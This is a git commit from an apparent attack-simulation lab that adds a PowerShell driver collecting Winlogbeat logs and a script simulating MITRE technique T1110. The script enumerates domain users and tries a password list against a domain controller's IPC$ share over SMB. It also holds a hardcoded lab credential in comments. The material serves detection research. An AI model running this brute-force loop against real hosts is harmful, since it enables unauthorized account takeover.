ba55aa2ee0923b591e5e3457bdc6cae58f5c8321
internal_user_01 <internal_user_01@patternex.lab>
2019-07-29 19:12:38 -0700

    T1110 use case complete

---
+++ bin/run_simulation_driver.ps1
@@ -0,0 +1,53 @@
+﻿ param (
+#    [Parameter(Mandatory=$true)][string]$use_case = ""
+    [string]$use_case = $(throw "-use_case is required."),
+    [switch]$collect_logs = $false
+ )
+
+ # example: .\bin\run_simulation_driver.ps1 -use_case "T1110" -collect_logs:$true
+
+ # variables
+ $root_path = '/adrian_ptrx'
+ $repo_path = $root_path + '/simulation'
+ $bin_path = $repo_path + '/bin'
+ $simulation_path = $repo_path + '/use_case'
+ $beat_path = "C:\Program Files\winlogbeat\winlogbeat.exe"
+
+write-output "Launching log collector with config: $($use_case)/winlogbeat.yml"
+Try {
+  $winlogbeat = Start-Process -FilePath $($beat_path) -ArgumentList "-c $($simulation_path)/$($use_case)/winlogbeat.yml"  -PassThru
+  write-output "Collecting logs ..."
+}
+Catch { 
+    Write-Host "An error occured launching the log collector process with config: $($use_case)/winlogbeat.yml" -ForegroundColor Red
+    Exit
+}
+
+
+write-output "Launching attack simulation: $($use_case)"
+Try {
+  cd "$($simulation_path)/$($use_case)"
+  $powershellArguments = "$($simulation_path)/$($use_case)/run_use_case_simulation.ps1"
+  $proc = Start-Process powershell.exe -ArgumentList $powershellArguments  -PassThru
+  write-output "Simulating attack ..."
+  $proc.WaitForExit()
+}
+Catch { 
+    Write-Host "An error occured launching the attack simulation: $($use_case)   -   exited with status code $($proc.ExitCode)" -ForegroundColor Red
+}
+cd $repo_path
+
+
+write-output "Stopping log collector process: $($winlogbeat)"
+Try {
+
+  # $winlogbeat = Get-Process "winlogbeat" 
+  $winlogbeat.kill()
+  write-output "Kill successful."
+}
+Catch { 
+    Write-Host "We could not kill the log collector process: $($winlogbeat)" -ForegroundColor Red
+    Exit
+}
+
+write-output "Done."
---
+++ use_case/T1110/run_use_case_simulation.ps1
@@ -0,0 +1,24 @@
+﻿
+# GENERATE DATA
+#net user /domain > .\data\input_file_users.txt
+#echo "Password1" >> .\data\input_file_passwords.txt
+#echo "1q2w3e4r" >>  .\data\input_file_passwords.txt
+#echo "Password!" >> .\data\input_file_passwords.txt
+
+## DEBUG CONNECTIVITY
+#$remote_host = 'pexlab-dc'
+#$user = 'internal_user_01'
+#$password = 'patternexL1'
+#New-SmbMapping  -RemotePath "\\$($remote_host)\ipc$"  -UserName $user  -Password $password  
+#Remove-SmbMapping -RemotePath "\\$($remote_host)\ipc$"  -Force
+
+# SIMULATION
+foreach($users_line in [System.IO.File]::ReadLines('C:\adrian_ptrx\simulation\use_case\T1110\data\input_file_users.txt')) {
+  foreach ($user in $users_line -split "\s+" -match '\S') {
+    foreach($password in [System.IO.File]::ReadLines('C:\adrian_ptrx\simulation\use_case\T1110\data\input_file_passwords.txt')) {
+        write-output "\\$($remote_host)\ipc$", $user, $password  
+        New-SmbMapping  -RemotePath "\\$($remote_host)\ipc$"  -UserName $user  -Password $password  
+        Remove-SmbMapping -RemotePath "\\$($remote_host)\ipc$"  -Force
+    }
+  }
+}
